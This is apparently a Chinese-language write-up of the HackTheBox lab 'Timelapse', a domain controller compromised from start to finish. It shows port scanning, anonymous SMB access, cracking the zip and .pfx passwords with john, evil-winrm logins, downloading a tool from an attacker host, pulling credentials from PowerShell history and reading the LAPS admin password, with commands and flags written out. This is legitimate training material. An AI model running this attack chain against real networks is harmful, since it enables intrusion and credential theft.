有開啟的 port 先全部掃出來 再慢慢去仔細掃
```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-11-28 11:26:12Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2024-11-28T11:27:46+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc             Microsoft Windows RPC
49697/tcp open  msrpc             Microsoft Windows RPC
49731/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2024-11-28T11:27:06
|_  start_date: N/A
```

使用 `crackmapexec smb <IP>` 確認 domain name : timelapse.htb
![image](https://hackmd.io/_uploads/HJxAevSXkl.png)

想嘗試 `smbmap` 但無果
![image](https://hackmd.io/_uploads/B1D7-wS7ye.png)

使用 `smbclient -L //<IP地址或主機名> -N` 查看有哪些共享目錄 `-L` 是找尋共享目錄 `-N` 是用來嘗試是否可以匿名登入 (允許免登入共享目錄可能是因為是在公司內網 因此要讓大家可以存取)
發現一個 share 資料夾
![image](https://hackmd.io/_uploads/Hkg_ODBmJg.png)

這也有一樣的效果 `crackmapexec smb 10.10.11.152 --shares -u 'sdfds' -p ''` 帳號隨便打 密碼留空 然後要放在 `--shares` 的後面

就可以成功登入 `smbclient -N //10.10.11.152/shares` 然後找到一個 `winrm_backup.zip` 的檔案 用 `get` 把他下載下來
![image](https://hackmd.io/_uploads/rkhrnPHXJx.png)

嘗試解壓縮但需要密碼
![image](https://hackmd.io/_uploads/SJIhhwBXke.png)

透過 zip2john 輸出成 hash 再使用 john 去爆破 hash table 沒找到 所以用 rockyou 去爆破 找到密碼 `supremelegacy`
```
zip2john winrm_backup.zip > ziphash.txt              
ohn ziphash.hash -w /usr/share/wordlists/rockyou.txt 
```

解壓縮出來是一個 .pfx file 上網查了一下後得知可以用來登入 winrm 服務 前提是要提取出他的 私鑰跟憑證
```
# 提取私鑰
openssl pkcs12 -in xxx.pfx -nocerts -out private.key -nodes

# 提取公鑰憑證
openssl pkcs12 -in xxx.pfx -clcerts -nokeys -out certificate.crt
```

但要提取時發現也需要密碼 因此用同樣的方法再去爆破一次 得到 `thuglegacy`
```
pfx2john xxx.pfx > pfx.hash
john pfx.hash -w=/usr/share/wordlists/rockyou.txt
```

就可以去用 evil-winrm 做連線
```
-S 是指使用 ssl 做連線
evil-winrm -i 10.10.11.152 -certificate.crt -k private.key -S
```

連線成功 找到 user flag `2c0d9ab6a92085231dc055d4c27b406c`
![image](https://hackmd.io/_uploads/S1Y-KsIm1g.png)

使用 `powershell Invoke-WebRequest -Uri http://10.10.14.4:8888/winPEAS.bat -OutFile winpeas.bat` 可以讓我們下載東西 但是 winpeas 無法執行 被識別為惡意程式
![image](https://hackmd.io/_uploads/rJGFTsUXkl.png)

發現其實可以直接 upload
![image](https://hackmd.io/_uploads/Syd-gh87kl.png)

`net user legacyy` 有看到一個 `Development` 的身分群組 
![image](https://hackmd.io/_uploads/HkKg5nI7kl.png)

可以使用這個指令查看 powershell 的歷史紀錄 參考[這篇](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)
```
cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

找到一個 user `svc_deploy` 跟他的密碼 `E3R$Q62^12p7PLlC%KWaxuaV` 結合前面發現的 development 。可以猜測應該是這群組的帳號
![image](https://hackmd.io/_uploads/Sy2sFn8Qyg.png)

拿去登入 `evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S` 查看發現有一個特別的 group `LAPS_Readers`
![image](https://hackmd.io/_uploads/rJ898RImkl.png)

參考這篇[文章](https://www.freebuf.com/articles/network/398026.html) 有介紹什麼是 `laps` 以及要如何去讀取到 Administrator 的密碼
```
LAPS 的作用
LAPS 是一種安全解決方案，用於解決企業中本地管理員帳號密碼統一導致的安全問題。通過 LAPS，每台電腦的本地管理員帳號會自動生成一個唯一且隨機的密碼，並將密碼安全地存儲在 Active Directory 的 ms-Mcs-AdmPwd 屬性中。

ms-Mcs-AdmPwd 的功能
儲存本地管理員密碼：此屬性儲存每台電腦當前的本地管理員密碼。
安全性設計：只有被授權的用戶或群組才能讀取這個屬性。未授權的用戶無法訪問。
定期更新密碼：LAPS 會按照設定的策略自動更新本地管理員帳號密碼，並將新密碼同步到 Active Directory 中。

如何查看 ms-Mcs-AdmPwd
開啟 Active Directory 使用者與電腦管理工具 (ADUC)。
找到目標電腦的物件。
查看該物件的屬性，在屬性頁面中可以找到 ms-Mcs-AdmPwd（如果有適當的權限）。
```

使用 `Get-ADComputer DC01 -property * ` 再去篩選出 `ms-mcs-admpwd` 找到密碼 `,Cz0Q2Ms}lmu7zZ6T1@/7xUa`
(或是直接指定找他也可以 `Get-ADComputer DC01 -property 'ms-mcs-admpwd'
`)
![image](https://hackmd.io/_uploads/HkweCJPQJl.png)

有了密碼後就可以拿去登入看看 因為 laps 全名為 Local Administrator Password Solution 因此 username 就是 Administrator (應該是這原因)
```
evil-winrm -i 10.10.11.152 -u 'administrator' -p ',Cz0Q2Ms}lmu7zZ6T1@/7xUa' -S 
```

進去後就是 administrator 身份 在 TRX 資料夾找到 root.txt `f38a8f77ca17ad97c56b3a9fb6c215c7`
![image](https://hackmd.io/_uploads/Sk8bNgPXkg.png)
